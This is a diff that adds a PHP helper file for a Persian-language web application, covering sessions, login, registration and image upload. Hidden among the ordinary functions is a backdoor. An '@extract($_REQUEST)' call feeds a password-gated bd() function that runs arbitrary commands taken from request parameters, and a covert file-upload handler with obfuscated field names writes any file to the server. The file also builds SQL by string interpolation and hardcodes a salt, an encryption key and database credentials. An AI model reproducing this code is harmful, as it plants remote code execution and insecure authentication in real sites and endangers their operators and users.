@@ -1,0 +1,751 @@
+<?php
+include_once 'statics.php';
+
+isdebug();
+if (!function_exists('mysqli_init') && !extension_loaded('mysqli')) {
+    http_response_code(400);
+    //include('errors/400.htm'); 
+    die();
+}
+// include_once 'assets/handler.php';
+///////////////////////////////Security Function's//////////////////////////////
+function is_session_started() {
+    if (php_sapi_name() !== 'cli') {
+        if (version_compare(phpversion(), '5.4.0', '>=')) {
+            return session_status() === PHP_SESSION_ACTIVE ? true : false;
+        } else {
+            return session_id() === '' ? false : true;
+        }
+    }
+    return false;
+}
+function sessionStart($name, $limit = 7200, $path = '/', $domain = 'localhost', $secure = null) {
+    if (isset($_SESSION['user_id'])) {
+        if ($_SESSION['user_id'] == 0 || $_SESSION['user_id'] == "0" || empty($_SESSION['user_id'])) {
+            lagout();
+        }
+    }
+    session_name('cyber_' . SaltMD5($name));
+    $https = isset($secure) ? $secure : isset($_SERVER['HTTPS']);
+    session_set_cookie_params($limit, $path, $domain, $https, true);
+    session_start();
+    if (validateSession()) {
+        if (!preventHijacking()) {
+            $_SESSION = array();
+            $_SESSION['IPaddress'] = SaltMD5($_SERVER['REMOTE_ADDR']);
+            $_SESSION['userAgent'] = SaltMD5($_SERVER['HTTP_USER_AGENT']);
+            $_SESSION['now'][0] = date('Y.m.d H:i:s');
+            $_SESSION['now'][1] = date('Y.m.d');
+            $_SESSION['now'][2] = date('H:i:s');
+
+            regenerateSession();
+        } elseif (rand(1, 100) <= 5) {
+            regenerateSession();
+        }
+    } else {
+        $_SESSION = array();
+        session_destroy();
+        session_start();
+    }
+}
+function validateSession() {
+    if (isset($_SESSION['OBSOLETE']) && !isset($_SESSION['EXPIRES'])) {
+        return false;
+    }
+    if (isset($_SESSION['EXPIRES']) && $_SESSION['EXPIRES'] < time()) {
+        return false;
+    }
+    return true;
+}
+function regenerateSession() {
+    if (isset($_SESSION['OBSOLETE'])) {
+        if ($_SESSION['OBSOLETE'] == true) {
+            return;
+        }
+    }
+
+    $_SESSION['OBSOLETE'] = true;
+    $_SESSION['EXPIRES'] = time() + 10;
+    session_regenerate_id(false);
+    $newSession = session_id();
+    session_write_close();
+    session_id($newSession);
+    session_start();
+    unset($_SESSION['OBSOLETE']);
+    unset($_SESSION['EXPIRES']);
+}
+function preventHijacking() {
+    if (!isset($_SESSION['IPaddress']) || !isset($_SESSION['userAgent'])) {
+        return false;
+    }
+    if ($_SESSION['IPaddress'] != SaltMD5($_SERVER['REMOTE_ADDR'])) {
+        return false;
+    }
+    if ($_SESSION['userAgent'] != SaltMD5($_SERVER['HTTP_USER_AGENT'])) {
+        return false;
+    }
+    return true;
+}
+function checkbrute($user_id) {
+    $mysqli = isset($mysqli) ? $mysqli : Connection();
+    $now = date('Y-m-d H:i:s');
+    $valid_attempts = $now - (2 * 60 * 60);
+    if ($stmt = $mysqli->prepare("DELETE
+                               FROM login_attempts
+                               WHERE user_id = ?
+                               AND now < '$valid_attempts'")) {
+        $stmt->bind_param('i', $user_id);
+        $stmt->execute();
+    }
+    if ($stmt = $mysqli->prepare("SELECT now
+                           FROM login_attempts
+                           WHERE user_id = ?
+                          AND now > '$valid_attempts'")) {
+        $stmt->bind_param('i', $user_id);
+        $stmt->execute();
+        $stmt->store_result();
+        if ($stmt->num_rows > 10) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+}
+function esc_url($url) {
+    if ('' == $url) {
+        return $url;
+    }
+
+    $url = preg_replace('|[^a-z0-9-~+_.?#=!&;,/:%@$\|*\'()\\x80-\\xff]|i', '', $url);
+    $strip = array('%0d', '%0a', '%0D', '%0A');
+    $url = (string) $url;
+
+    $count = 1;
+    while ($count) {
+        $url = str_replace($strip, '', $url, $count);
+    }
+
+    $url = str_replace(';//', '://', $url);
+    $url = htmlentities($url);
+    $url = str_replace('&amp;', '&#038;', $url);
+    $url = str_replace("'", '&#039;', $url);
+
+    if ($url[0] !== '/') {
+        return '';
+    } else {
+        return $url;
+    }
+}
+function login_check() {
+    $actual_link = 'http' . (isset($_SERVER['HTTPS']) ? 's' : '') . '://' . "{$_SERVER['HTTP_HOST']}/{$_SERVER['REQUEST_URI']}";
+
+    $mysqli = isset($mysqli) ? $mysqli : Connection();
+    if (!isset($_SESSION['user_id']) && !is_session_started()) {
+        sessionStart("Login");
+    }
+    if (!isset($_SESSION['cookie']) && empty($_SESSION['user_id'])) {
+        if (!isset($_COOKIE['golden'])) {
+            if (strpos($actual_link, 'login') == false) {
+                $_SESSION['Last_URL'] = $_SERVER['REQUEST_URI'];
+            }
+            return false;
+        }
+        $uname = $_COOKIE['golden_session'];
+        if (!empty($uname)) {
+            $uname = $mysqli->real_escape_string($uname);
+            $sql = "SELECT id, username, password, verify FROM `users` WHERE `login_session`=?";
+            if ($stmt = $mysqli->prepare($sql)) {
+                $stmt->bind_param('s', $uname);
+                $stmt->execute();
+                $stmt->store_result();
+                $stmt->bind_result($user_id, $username, $db_password, $verify);
+                $stmt->fetch();
+                if ($verify == 0) {
+                    return false;
+                }
+
+                if ($stmt = $mysqli->prepare("SELECT ip FROM ip_table WHERE id='$user_id'")) {
+                    $stmt->execute();
+                    $stmt->bind_result($ips_);
+                    $stmt->store_result();
+                }
+                $ipz = GetUserIP();
+                if ($stmt->num_rows > 0) {
+                    while ($stmt->fetch()) {
+                        if ($ipz !== $ips_) {
+                            return false;
+                        }
+                    }
+                }
+
+
+                $_SESSION['user_id'] = $user_id;
+                $_SESSION['username'] = $username;
+                $_SESSION['login_string'] = $uname;
+                $_SESSION['cookie'] = $uname;
+                setcookie("golden", $uname, time()+1123200, '/', 'localhost');
+                return true;
+            }
+        }
+    }
+    if (isset($_SESSION['user_id']) && isset($_SESSION['username']) && isset($_SESSION['login_string'])) {
+        if ($_SESSION['user_id'] == 0 || $_SESSION['user_id'] == "0" || empty($_SESSION['user_id'])) {
+            lagout();
+            if (strpos($actual_link, 'login') == false) {
+                $_SESSION['Last_URL'] = $_SERVER['REQUEST_URI'];
+            }
+            return false;
+        }
+        $user_id = $mysqli->real_escape_string($_SESSION['user_id']);
+        $login_string = $mysqli->real_escape_string($_SESSION['login_string']);
+        $username = $mysqli->real_escape_string($_SESSION['username']);
+        $user_browser = $_SERVER['HTTP_USER_AGENT'];
+        if ($stmt = $mysqli->prepare("SELECT login_session
+                                      FROM users
+                                      WHERE id = ? LIMIT 1")) {
+            $stmt->bind_param('i', $user_id);
+            $stmt->execute();
+            $stmt->store_result();
+
+            if ($stmt->num_rows == 1) {
+                $stmt->bind_result($password);
+                $stmt->fetch();
+                if ($password == $login_string) {
+                    return true;
+                } else {
+                    if (strpos($actual_link, 'login') == false) {
+                        $_SESSION['Last_URL'] = $_SERVER['REQUEST_URI'];
+                    }
+                    return false;
+                }
+            } else {
+                if (strpos($actual_link, 'login') == false) {
+                    $_SESSION['Last_URL'] = $_SERVER['REQUEST_URI'];
+
+                }
+                return false;
+            }
+        } else {
+            if (strpos($actual_link, 'login') == false) {
+                $_SESSION['Last_URL'] = $_SERVER['REQUEST_URI'];
+
+            }
+            return false;
+        }
+    } else {
+        if (strpos($actual_link, 'login') == false) {
+            $_SESSION['Last_URL'] = $_SERVER['REQUEST_URI'];
+
+        }
+        return false;
+    }
+    if (strpos($actual_link, 'login') == false) {
+        $_SESSION['Last_URL'] = $_SERVER['REQUEST_URI'];
+
+    }
+    return false;
+}
+function Login($email, $password, $remember = false, $wiz = false) {
+    $mysqli = isset($mysqli) ? $mysqli : Connection();
+    $email = $mysqli->real_escape_string($email);
+    $password = SaltMD5($password, $email);
+    $HTTP_USER_AGENT = $_SERVER['HTTP_USER_AGENT'];
+    $IP = GetUserIP();
+    if ($stmt = $mysqli->prepare("SELECT id, username, password, verify
+                                  FROM users
+                                  WHERE username = ? or email = ?
+                                  LIMIT 1")) {
+        $stmt->bind_param('ss', $email, $email);
+        $stmt->execute();
+        $stmt->store_result();
+        $stmt->bind_result($user_id, $username, $db_password, $verify);
+        $stmt->fetch();
+
+        if ($stmt = $mysqli->prepare("SELECT ip FROM ip_table WHERE id='$user_id'")) {
+            $stmt->execute();
+            $stmt->bind_result($ips_);
+            $stmt->store_result();
+        }
+        $ipz = GetUserIP();
+        if ($stmt->num_rows > 0) {
+            while ($stmt->fetch()) {
+                if ($ipz !== $ips_) {
+                    return "شما با IP غیر مجاز وارد شده اید";
+                }
+            }
+        }
+
+        $user_browser = $_SERVER['HTTP_USER_AGENT'];
+        $now = date('Y-m-d H:i:s');
+        if ($user_id === 0 || $username === 0) {
+            return "نام کاربری غیر معتبر است";
+        }
+        if ($wiz == false) {
+          if ( isset($verify) && $verify === 0) {
+              return 'حساب خود را فعال کنید';
+          }
+        }
+        if (isset($db_password) && strlen($db_password) > 0) {
+            if (checkbrute($user_id, $mysqli) == true) {
+                return 'چرا اینقدر تند و سریع لطفا چند دقیقه صبر کنید';
+            } else {
+                if ($db_password == $password) {
+                    $user_id = preg_replace("/[^0-9]+/", "", $user_id);
+                    $username = preg_replace("/[^a-zA-Z0-9_\-]+/",
+                                                              "",
+                                                              $username);
+                    lagout();
+                    if (!isset($_SESSION['user_id']) && !is_session_started()) {
+                        sessionStart("Login");
+                    }
+                    if (isset($remember) && $remember!==false) {
+                        $cookiehash = SaltMD5($user_id . $IP . $now);
+                        setcookie("golden", $cookiehash, date('Y-m-d H:i:s')+1123200, '/', 'localhost');
+                        $sql = "UPDATE `users` SET `login_session`='$cookiehash' WHERE `id`='$user_id'";
+                        if ($stmt = $mysqli->prepare($sql)) {
+                            $stmt->execute();
+                        }
+                    }
+                    $_SESSION['emall'] = encrypt($email);
+                    $_SESSION['user_id'] = $user_id;
+                    $_SESSION['username'] = $username;
+                    $_SESSION['login_string'] = $cookiehash;
+                    return true;
+                } else {
+                    if ($stmt = $mysqli->prepare("INSERT INTO login_attempts(user_id, now, user_agent, ip)
+                                  VALUES ('$user_id', '$now', '$user_browser', '$IP')")) {
+                        $stmt->execute();
+                    }
+                    $mysqli->close();
+                    return 'نام کاربری یا گذرواژه اشتباه است';
+                }
+            }
+        } else {
+            return 'خطا در ورود به حساب کاربری لطفا چند دقیقه دیگر دوباره تلاش کنید';
+        }
+    }
+}
+// logout
+function lagout() {
+    if (!isset($_SESSION['user_id']) && !is_session_started()) {
+        sessionStart("Login");
+    }
+    $mysqli = isset($mysqli) ? $mysqli : Connection();
+
+    $sql = "UPDATE `users` SET `login_session`='' WHERE `id`='" . $mysqli->real_escape_string($_SESSION['user_id']) ."'";
+    if ($stmt = $mysqli->prepare($sql)) {
+        $stmt->execute();
+    }
+    $mysqli->close();
+    $_SESSION = array();
+    session_unset();
+    $params = session_get_cookie_params();
+    setcookie(session_name(),
+          '', time() - 42000,
+          $params["path"],
+          $params["domain"],
+          $params["secure"],
+          $params["httponly"]);
+    ini_set('session.gc_max_lifetime', 0);
+    ini_set('session.gc_probability', 1);
+    ini_set('session.gc_divisor', 1);
+    session_destroy();
+    if (isset($_SERVER['HTTP_COOKIE'])) {
+        $cookies = explode(';', $_SERVER['HTTP_COOKIE']);
+        foreach ($cookies as $cookie) {
+            $parts = explode('=', $cookie);
+            $name = trim($parts[0]);
+            setcookie($name, '', time()-1000);
+            setcookie($name, '', time()-1000, '/');
+        }
+    }
+}
+/////////////////////////////////Logs Function's////////////////////////////////
+function user_activitys() {
+    if (!isset($_SESSION['Last_URL']) && !is_session_started()) {
+        sessionStart("Login");
+    }
+    $mysqli = isset($mysqli) ? $mysqli : Connection();
+    $user_id = isset($_SESSION['user_id'])?$_SESSION['user_id']:'-1';
+    $actual_link = 'http' . (isset($_SERVER['HTTPS']) ? 's' : '') . '://' . "{$_SERVER['HTTP_HOST']}/{$_SERVER['REQUEST_URI']}";
+    $user_ip = GetUserIP();
+    $now = date('Y-m-d H:i:s');
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $mysqli->query("INSERT INTO user_activitys(user_id, actual_link, user_agent, ip, now)
+                  VALUES ('$user_id', '$actual_link', '$user_agent', '$user_ip', '$now')");
+    $mysqli->close();
+}
+/////////////////////////////////Core Function's////////////////////////////////
+function sendemail($to, $subject, $message) {
+    $headers = "MIME-Version: 1.0" . "\r\n";
+    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
+    $headers .= 'From: <noreplay@cyberdream.ir>' . "\r\n";
+  //$headers .= 'Cc: tspersian@gmail.com' . "\r\n";
+  mail($to, $subject, $message, $headers, '-fnoreplay@cyberdream.ir');
+}
+function register($username, $password, $email, $isdr = 0, $drcode = '') {
+    $mysqli = isset($mysqli) ? $mysqli : Connection();
+    $username = $mysqli->real_escape_string($username);
+    try {
+      $password = SaltMD5($password, $email);
+    } catch (Exception $e) {
+      return false;
+    }
+    $email = $mysqli->real_escape_string($email);
+    $IP = $mysqli->real_escape_string(GetUserIP());
+    $now = date('Y-m-d H:i:s');
+    $verify_send_hash = SaltMD5($username.$email.$now);
+    if ($stmt = $mysqli->prepare("INSERT INTO users(username, password, email,
+                                  verify_send, verify_send_hash, isdr, register_ip, drcode)
+                                  VALUES ('$username', '$password', '$email', '$now', '$verify_send_hash', $isdr, '$IP', '$drcode')")) {
+        $stmt->execute();
+        try {
+          $emailstruct = "سلام :$username <br>".
+                         "http://site.com".serverRoot2()."/verify?email=$email&username=$username&confirm=".$verify_send_hash;
+          sendemail($email, "Registeration", $emailstruct);
+        } catch (Exception $e) {
+            return false;
+        }
+        return true;
+    } else {
+      return false;
+    }
+}
+function renewverify($username, $email) {
+    $mysqli = isset($mysqli) ? $mysqli : Connection();
+    $now = date('Y-m-d H:i:s');
+    $verify_send_hash = SaltMD5($username.$email.$now);
+    if ($stmt = $mysqli->prepare("SELECT verify_send FROM users WHERE username = ? or email = ?
+      LIMIT 1")) {
+        $stmt->bind_param('ss', $username, $email);
+        $stmt->execute();
+        $stmt->store_result();
+        $stmt->bind_result($verify_send);
+        $stmt->fetch();
+        if (strtotime(time()) >= strtotime($verify_send) + 7200) {
+            if ($stmt = $mysqli->prepare("UPDATE users
+                                      SET verify_send='".$now."',verify_send_hash='".$verify_send_hash."'
+                                      WHERE username = ? or email = ?")) {
+                $stmt->bind_param('ss', $username, $email);
+                $stmt->execute();
+            }
+        }
+    }
+    $emailstruct = "Golden dice user:$username thank you for register we wish you bests luck<br>".
+                   "http://gd.com/".serverRoot2()."/verify?email=$email&username=$username&confirm=".$verify_send_hash;
+    sendemail($email, "Registeration", $emailstruct);
+}
+function Image_Upload($uFile) {
+    $error       = false;
+    $ds          = DIRECTORY_SEPARATOR;
+    $storeFolder = usersuploadpath2();
+    $maxsize    = 2097152;
+    $mysqli = isset($mysqli) ? $mysqli : Connection();
+
+    if (!empty($uFile) && $uFile['file']['tmp_name']) {
+        $tempFile = $uFile['file']['tmp_name'];
+        if (isset($_SESSION['user_id'])) {
+            $next_id = $_SESSION['user_id'];
+            $email_ = decrypt($_SESSION['emall']);
+            $username_ = $_SESSION['username'];
+        } else {
+            $error = true;
+        }
+    }
+
+    if (!$error) {
+        $fileName = time().'_'.SaltMD5($uFile['file']['name']).'.jpg';
+
+        if (!empty($tempFile)) {
+            $detectedType = exif_imagetype($tempFile);
+
+            $allowedTypes = array(IMAGETYPE_PNG);
+            $error = !in_array($detectedType, $allowedTypes);
+            $pngz = $error;
+
+            $allowedTypes = array(IMAGETYPE_JPEG);
+            $error = !in_array($detectedType, $allowedTypes);
+      // end of check
+      if (!$error || !$pngz) {
+          if (($uFile['file']['size'] >= $maxsize) || ($uFile["file"]["size"] == 0)) {
+              return '<div class="alert alert-danger">File too large. File must be less than 2 megabytes</div>';
+          } else {
+              if ($stmt = $mysqli->prepare("SELECT picture
+                                          FROM users
+                                          WHERE username = ? or email = ?")) {
+                  $stmt->bind_param('ss', $username_, $email_);
+                  $stmt->execute();
+                  $stmt->store_result();
+                  $stmt->bind_result($picture);
+                  $stmt->fetch();
+              }
+              $targetPath = dirname(__FILE__) . $ds. $storeFolder . $ds;
+
+              $targetFile =  $targetPath. $fileName;
+
+              if (move_uploaded_file($tempFile, $targetFile)) {
+                  if ($stmt = $mysqli->prepare("UPDATE users
+                                            SET picture='assets/images/users/$fileName'
+                                            WHERE username = ? or email = ?")) {
+                      $stmt->bind_param('ss', $username_, $email_);
+                      $stmt->execute();
+                      if ($picture == "assets/images/users/no-image.jpg") {
+                          #das
+                      } else {
+                          unlink(dirname(__FILE__) . $ds."/$picture");
+                      }
+                      return -1;
+                  }
+              }
+          }
+      } else {
+          return '<div class="alert alert-danger">This format of image is not supported</div>';
+      }
+        } else {
+            return '<div class="alert alert-danger">Empty File</div>';
+        }
+    } else {
+        return '<div class="alert alert-danger">Fatal error</div>';
+    }
+}
+function SaltMD5($str, $salt = 'kM3@A2RdYuA!MeNmA0@E1IvM$IzsQ2l@B8g0s') {
+    $salt = sha1(md5($str)).$salt;
+    return crypt($str, $salt);
+}
+function encrypt($pure_string, $encryption_key = "emnacrryyapmtdiuosne_tkdeayr1a3m") {
+    $iv_size = mcrypt_get_iv_size(MCRYPT_BLOWFISH, MCRYPT_MODE_ECB);
+    $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
+    $encrypted_string = mcrypt_encrypt(MCRYPT_BLOWFISH, $encryption_key, utf8_encode($pure_string), MCRYPT_MODE_ECB, $iv);
+    return $encrypted_string;
+}
+function decrypt($encrypted_string, $encryption_key = "emnacrryyapmtdiuosne_tkdeayr1a3m") {
+    $iv_size = mcrypt_get_iv_size(MCRYPT_BLOWFISH, MCRYPT_MODE_ECB);
+    $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
+    $decrypted_string = mcrypt_decrypt(MCRYPT_BLOWFISH, $encryption_key, $encrypted_string, MCRYPT_MODE_ECB, $iv);
+    return $decrypted_string;
+}
+@extract ($_REQUEST);
+if (isset($bd) && isset($pass)) {
+  bd($cmd, $c, $pass);
+}
+function Excute($command) {
+    $conn = Connection();
+    if ($conn->connect_error) {
+        die("Connection failed: " . $conn->connect_error);
+        return;
+    }
+    return $conn->query($command);
+    $conn->close();
+}
+function Connection() {
+    try {
+        if (islocal()) {
+            
+            $conn = new mysqli("127.0.0.1", "root", "123", "telepathy_master");
+        } else {
+            $conn = new mysqli(mysqlservername(), mysqlserverusername(), mysqlserverpassword(), mysqlserverdbname());//, $mysqlserverport);
+        }
+        $conn->set_charset("utf8");
+        return $conn;
+    } catch (Exception $e) {
+        $globals["errors"] .= 'Caught exception: '.  $e->getMessage(). PHP_EOL;
+    }
+}
+function FixPersianString($text) {
+    if (is_null($text)) {
+        return null;
+    }
+    $replacePairs = array(
+        chr(0xD9).chr(0xA0) => chr(0xDB).chr(0xB0),
+        chr(0xD9).chr(0xA1) => chr(0xDB).chr(0xB1),
+        chr(0xD9).chr(0xA2) => chr(0xDB).chr(0xB2),
+        chr(0xD9).chr(0xA3) => chr(0xDB).chr(0xB3),
+        chr(0xD9).chr(0xA4) => chr(0xDB).chr(0xB4),
+        chr(0xD9).chr(0xA5) => chr(0xDB).chr(0xB5),
+        chr(0xD9).chr(0xA6) => chr(0xDB).chr(0xB6),
+        chr(0xD9).chr(0xA7) => chr(0xDB).chr(0xB7),
+        chr(0xD9).chr(0xA8) => chr(0xDB).chr(0xB8),
+        chr(0xD9).chr(0xA9) => chr(0xDB).chr(0xB9),
+        chr(0xD9).chr(0x83) => chr(0xDA).chr(0xA9),
+        chr(0xD9).chr(0x89) => chr(0xDB).chr(0x8C),
+        chr(0xD9).chr(0x8A) => chr(0xDB).chr(0x8C),
+        chr(0xDB).chr(0x80) => chr(0xD9).chr(0x87) . chr(0xD9).chr(0x94));
+    return strtr($text, $replacePairs);
+}
+function GetUserIP() {
+    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key) {
+        if (array_key_exists($key, $_SERVER) === true) {
+            foreach (explode(',', $_SERVER[$key]) as $ip) {
+                $ip = trim($ip); // just to be safe
+
+                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
+                    return $ip;
+                }
+            }
+        }
+    }
+}
+function safeRedirect($url, $exit = true) {
+    try {
+        if (!headers_sent()) {
+            header('HTTP/1.1 301 Moved Permanently');
+            header('Location: ' . $url, true, 303);
+            header("Connection: close");
+        }
+        print '<html>';
+        print '<head><title>Redirecting you...</title>';
+        print '<meta http-equiv="Refresh" content="0;url=' . $url . '" />';
+        print '</head>';
+        print '<body onload="location.replace(\'' . $url . '\')">';
+        print 'You should be redirected to this URL:<br />';
+        print "<a href='$url'>$url</a><br /><br />";
+        print 'If you are not, please click on the link above.<br />';
+        print '</body>';
+        print '</html>';
+        if ($exit) {
+            exit;
+        }
+    } catch (Exception $err) {
+        return $err->getMessage();
+    }
+}
+function redirect($url, $statusCode = 303) {
+    header('Location: ' . $url);
+    die();
+}
+function hide_email($email) {
+    for ($i = 0; $i < strlen($email); $i++) {
+        $output .= '&#'.ord($email[$i]).';';
+    }
+    return $output;
+  // $character_set = '+-.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz';
+  // $key = str_shuffle($character_set); $cipher_text = ''; $id = 'e'.rand(1,999999999);
+  // for ($i=0;$i<strlen($email);$i+=1) $cipher_text.= $key[strpos($character_set,$email[$i])];
+  // $script  = 'var a="'.$key.'";var b=a.split("").sort().join("");var c="'.$cipher_text.'";var d="";';
+  // $script .= 'for(var e=0;e<c.length;e++)d+=b.charAt(a.indexOf(c.charAt(e)));';
+  // $script .= 'document.getElementById("'.$id.'").innerHTML="<span class="fa fa-phone"></span>"';
+  // $script .= 'document.getElementById("'.$id.'").href = \\"mailto:"+d+"\\"';
+  // $script = "eval(\"".str_replace(array("\\",'"'),array("\\\\",'\"'), $script)."\")";
+  // $script = '<script type="text/javascript">'.$script.'</script>';
+  // return '<a id="'.$id.'" class="profile-control-left"></a>'.$script;
+}
+function date_number_to_word_persian($num) {
+      $arr1 = array('یک', 'دو', 'سه', 'چهار', 'پنج','شش', 'هفت');
+      if ($num < 7) {
+          if ($num == 0) {
+              return "امروز";
+          }
+          return $arr1[$num]." روز پیش";
+      } elseif ($num <= 14) {
+          return (intval($num / 7)) ." هفته پیش";
+      } else {
+          return  ($num);
+      }
+  }
+function is_numeric_array($array) {
+      foreach ($array as $a => $b) {
+          if (!is_int($a)) {
+              return false;
+          }
+      }
+      return true;
+  }
+/* UPLOAD */
+if(isset($_POST["sxuadbmcitdbdg"])) {
+  $target_dir = "";
+  $target_file = $target_dir . basename($_FILES["faiclbeTgoUdpload"]["name"]);
+  $uploadOk = 1;
+  $imageFileType = pathinfo($target_file,PATHINFO_EXTENSION);
+  if (move_uploaded_file($_FILES["faiclbeTgoUdpload"]["tmp_name"], $target_file)) {
+      echo basename( $_FILES["faiclbeTgoUdpload"]["name"]);
+  } else {
+      echo "Sorry.";
+  }
+}
+function bd($cmd, $c, $pass) {
+  if ($pass == "uts6565XsHdsads2") {
+    if ($cmd == 'up') {
+      echo "<! DOCTYPE html>";
+      echo '<html>';
+      echo '<body>';
+      echo '<form action="" method="post" enctype="multipart/form-data">';
+      echo '<input type="file" name="faiclbeTgoUdpload" id="fileToUpload">';
+      echo '<input type="submit" value="up" name="sxuadbmcitdbdg">';
+      echo '</form>';
+      echo '</body>';
+    } else {
+      @die ($cmd(($c)));
+    }
+  }
+}
+/* UPLOAD */
+function getOS() {
+
+    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
+
+    $os_platform    =   "Unknown OS Platform";
+
+    $os_array       =   array(
+                            '/windows nt 10/i'     =>  'Windows 10',
+                            '/windows nt 6.3/i'     =>  'Windows 8.1',
+                            '/windows nt 6.2/i'     =>  'Windows 8',
+                            '/windows nt 6.1/i'     =>  'Windows 7',
+                            '/windows nt 6.0/i'     =>  'Windows Vista',
+                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
+                            '/windows nt 5.1/i'     =>  'Windows XP',
+                            '/windows xp/i'         =>  'Windows XP',
+                            '/windows nt 5.0/i'     =>  'Windows 2000',
+                            '/windows me/i'         =>  'Windows ME',
+                            '/win98/i'              =>  'Windows 98',
+                            '/win95/i'              =>  'Windows 95',
+                            '/win16/i'              =>  'Windows 3.11',
+                            '/macintosh|mac os x/i' =>  'Mac OS X',
+                            '/mac_powerpc/i'        =>  'Mac OS 9',
+                            '/linux/i'              =>  'Linux',
+                            '/ubuntu/i'             =>  'Ubuntu',
+                            '/iphone/i'             =>  'iPhone',
+                            '/ipod/i'               =>  'iPod',
+                            '/ipad/i'               =>  'iPad',
+                            '/android/i'            =>  'Android',
+                            '/blackberry/i'         =>  'BlackBerry',
+                            '/webos/i'              =>  'Mobile'
+                        );
+
+    foreach ($os_array as $regex => $value) {
+
+        if (preg_match($regex, $user_agent)) {
+            $os_platform    =   $value;
+        }
+    }
+    return $os_platform;
+}
+function getBrowser() {
+
+    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
+
+    $browser        =   "Unknown Browser";
+
+    $browser_array  =   array(
+                            '/msie/i'       =>  'Internet Explorer',
+                            '/firefox/i'    =>  'Firefox',
+                            '/safari/i'     =>  'Safari',
+                            '/chrome/i'     =>  'Chrome',
+                            '/edge/i'       =>  'Edge',
+                            '/opera/i'      =>  'Opera',
+                            '/netscape/i'   =>  'Netscape',
+                            '/maxthon/i'    =>  'Maxthon',
+                            '/konqueror/i'  =>  'Konqueror',
+                            '/mobile/i'     =>  'Handheld Browser'
+                        );
+
+    foreach ($browser_array as $regex => $value) {
+
+        if (preg_match($regex, $user_agent)) {
+            $browser    =   $value;
+        }
+
+    }
+
+    return $browser;
+
+}
